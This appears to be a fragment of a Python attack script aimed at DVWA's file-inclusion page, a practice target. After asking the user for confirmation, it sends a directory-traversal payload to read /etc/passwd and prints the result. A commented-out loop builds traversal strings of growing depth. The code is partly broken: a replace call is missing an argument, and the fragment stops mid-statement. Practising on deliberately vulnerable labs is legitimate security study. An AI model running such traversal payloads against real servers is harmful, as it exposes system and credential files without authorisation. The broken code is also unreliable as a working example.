
# ======== File Inclusion cases ========


url_File_inclusion = host + "vulnerabilities/fi/?page=include.php"

basic_payload_file_inclusion_prompt = input("Perform basic LFI attack ?: [y] - [n]")
basic_payload_file_inclusion = "../../../../../../../../../../etc/passwd"
if basic_payload_file_inclusion_prompt == 'y':
    new_url_new_url_File_inclusion_II = url.replace("include.php",)
    response = session.post(url_File_inclusion + basic_payload_file_inclusion)
    print(response.text)
else:
    print("fail file inclusion")

# basic_payload_file_inclusion = "../"
# for i in range(1,7):
#     data=basic_payload_file_inclusion*i+file_name
#     req = session.post(


